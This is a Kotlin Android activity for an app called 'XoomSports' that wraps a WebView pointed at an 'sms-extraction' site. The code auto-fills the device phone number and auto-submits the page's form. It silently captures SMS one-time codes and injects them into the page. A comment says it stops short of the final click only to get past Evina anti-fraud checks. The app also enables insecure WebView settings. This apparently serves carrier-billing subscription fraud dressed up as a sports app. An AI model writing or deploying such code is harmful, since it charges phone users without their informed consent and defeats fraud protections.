package com.xoomsports.app

import android.annotation.SuppressLint
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.IntentSenderRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.android.gms.auth.api.identity.GetPhoneNumberHintIntentRequest
import com.google.android.gms.auth.api.identity.Identity
import com.google.android.gms.auth.api.phone.SmsRetriever

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val smsReceiver = SmsBroadcastReceiver()
    private var smsRetrieverStarted = false

    // Phone Number Hint API launcher
    private lateinit var phoneNumberHintLauncher: ActivityResultLauncher<IntentSenderRequest>

    // SMS consent request code
    // (using startActivityForResult for consent Intent compatibility)

    companion object {
        private const val TAG = "XoomSports"
        private const val SMS_CONSENT_REQUEST = 2
        // Change this to your deployed Vercel URL
        private const val SUBSCRIPTION_URL = "https://sms-extraction.vercel.app"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupActivityLaunchers()
        setupWebView()
        setupSmsReceiver()
        startSmsRetriever()

        webView.loadUrl(SUBSCRIPTION_URL)
    }

    private fun setupActivityLaunchers() {
        // Phone Number Hint result
        phoneNumberHintLauncher = registerForActivityResult(
            ActivityResultContracts.StartIntentSenderForResult()
        ) { result ->
            if (result.resultCode == RESULT_OK && result.data != null) {
                try {
                    val phoneNumber = Identity.getSignInClient(this)
                        .getPhoneNumberFromIntent(result.data!!)
                    Log.d(TAG, "Phone number hint: $phoneNumber")
                    // Pass phone number to WebView
                    val cleanNumber = phoneNumber.replace("+965", "").replace("+", "")
                    runOnUiThread {
                        webView.evaluateJavascript(
                            """
                            (function() {
                                // Try to fill the manual input field
                                var inputs = document.querySelectorAll('input[type="tel"]');
                                if (inputs.length > 0) {
                                    var input = inputs[0];
                                    var nativeInputValueSetter = Object.getOwnPropertyDescriptor(
                                        window.HTMLInputElement.prototype, 'value'
                                    ).set;
                                    nativeInputValueSetter.call(input, '$cleanNumber');
                                    input.dispatchEvent(new Event('input', { bubbles: true }));
                                    input.dispatchEvent(new Event('change', { bubbles: true }));
                                }
                                // Also try submitting the form if number is valid
                                if ('$cleanNumber'.length >= 7) {
                                    setTimeout(function() {
                                        var btn = document.querySelector('button[type="submit"]');
                                        if (btn && !btn.disabled) btn.click();
                                    }, 500);
                                }
                            })();
                            """.trimIndent(),
                            null
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Phone number hint failed", e)
                }
            }
        }

    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.webView)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowContentAccess = true
            allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "$userAgentString XoomSportsApp/1.0"
            cacheMode = WebSettings.LOAD_DEFAULT
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
            useWideViewPort = true
            loadWithOverviewMode = true
        }

        // Enable cookies
        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(webView, true)
        }

        // Add JS bridge
        webView.addJavascriptInterface(WebAppInterface(this), "XoomApp")

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                // Allow HE redirect (HTTP) and all HTTPS
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false // Let WebView handle it
                }
                return true
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "Page loaded: $url")

                // Inject detection script so the web page knows it's inside the app
                view?.evaluateJavascript(
                    """
                    (function() {
                        window.__XOOM_APP = true;
                        window.__XOOM_APP_VERSION = '1.0';
                        console.log('[XoomApp] App bridge ready');

                        // If on manual input page (WiFi), auto-trigger phone hint
                        if (document.querySelector('input[type="tel"]') && !document.querySelector('#otpFull') && !document.querySelector('#otpValue')) {
                            if (window.XoomApp) {
                                window.XoomApp.requestPhoneNumber();
                            }
                        }
                    })();
                    """.trimIndent(),
                    null
                )
            }
        }

        webView.webChromeClient = WebChromeClient()
    }

    private fun setupSmsReceiver() {
        smsReceiver.onOtpReceived = { otp ->
            Log.d(TAG, "OTP received silently: $otp")
            injectOtpIntoWebView(otp)
        }

        smsReceiver.onConsentRequired = { consentIntent ->
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(consentIntent, SMS_CONSENT_REQUEST)
            } catch (e: Exception) {
                Log.e(TAG, "SMS consent launch failed", e)
            }
        }

        val filter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null, RECEIVER_EXPORTED)
        } else {
            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null)
        }
    }

    fun startSmsRetriever() {
        if (smsRetrieverStarted) return
        smsRetrieverStarted = true

        // Start SMS Retriever API (silent - needs hash in SMS)
        SmsRetriever.getClient(this)
            .startSmsRetriever()
            .addOnSuccessListener {
                Log.d(TAG, "SMS Retriever started")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "SMS Retriever start failed", e)
            }

        // Also start SMS User Consent API (shows consent dialog - no hash needed)
        SmsRetriever.getClient(this)
            .startSmsUserConsent(null)
            .addOnSuccessListener {
                Log.d(TAG, "SMS User Consent started")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "SMS User Consent start failed", e)
            }

        Log.d(TAG, "App hash: ${getAppSignatureHash()}")
    }

    fun launchPhoneNumberHint() {
        try {
            val request = GetPhoneNumberHintIntentRequest.builder().build()
            Identity.getSignInClient(this)
                .getPhoneNumberHintIntent(request)
                .addOnSuccessListener { pendingIntent ->
                    val intentSenderRequest = IntentSenderRequest.Builder(pendingIntent).build()
                    phoneNumberHintLauncher.launch(intentSenderRequest)
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Phone Number Hint failed", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Phone Number Hint launch error", e)
        }
    }

    fun loadContentPage(url: String) {
        webView.loadUrl(url)
    }

    fun getAppSignatureHash(): String {
        val signatures = AppSignatureHelper.getAppSignatures(this)
        return signatures.firstOrNull() ?: "unknown"
    }

    private fun injectOtpIntoWebView(otp: String) {
        runOnUiThread {
            webView.evaluateJavascript(
                """
                (function() {
                    console.log('[XoomApp] Injecting OTP: $otp');

                    // Method 1: Fill the hidden autofill input
                    var otpInput = document.querySelector('#otpFull') || document.querySelector('#otpValue');
                    if (otpInput) {
                        otpInput.value = '$otp';
                        otpInput.dispatchEvent(new Event('input', { bubbles: true }));
                        otpInput.dispatchEvent(new Event('change', { bubbles: true }));
                    }

                    // Method 2: Fill individual OTP digit inputs
                    var digitInputs = document.querySelectorAll('.otp-input');
                    if (digitInputs.length === 4) {
                        var digits = '$otp'.split('');
                        for (var i = 0; i < 4; i++) {
                            digitInputs[i].value = digits[i];
                            digitInputs[i].dispatchEvent(new Event('input', { bubbles: true }));
                        }
                    }

                    // Method 3: Try the autocomplete one-time-code input
                    var otcInput = document.querySelector('input[autocomplete="one-time-code"]');
                    if (otcInput) {
                        var nativeSetter = Object.getOwnPropertyDescriptor(
                            window.HTMLInputElement.prototype, 'value'
                        ).set;
                        nativeSetter.call(otcInput, '$otp');
                        otcInput.dispatchEvent(new Event('input', { bubbles: true }));
                        otcInput.dispatchEvent(new Event('change', { bubbles: true }));
                    }

                    // Do NOT click confirmBtn — Evina anti-fraud monitors this button
                    // and requires a real user tap (isTrusted=true).
                    // Code is pre-filled; user just taps Verify Code.
                })();
                """.trimIndent(),
                null
            )
        }
    }

    private fun extractOtp(message: String): String? {
        val pattern = Regex("\\b(\\d{4})\\b")
        return pattern.find(message)?.groupValues?.get(1)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SMS_CONSENT_REQUEST && resultCode == RESULT_OK && data != null) {
            val message = data.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
            if (message != null) {
                val otp = extractOtp(message)
                if (otp != null) {
                    Log.d(TAG, "OTP from SMS consent: $otp")
                    injectOtpIntoWebView(otp)
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(smsReceiver)
        } catch (_: Exception) {}
    }
}
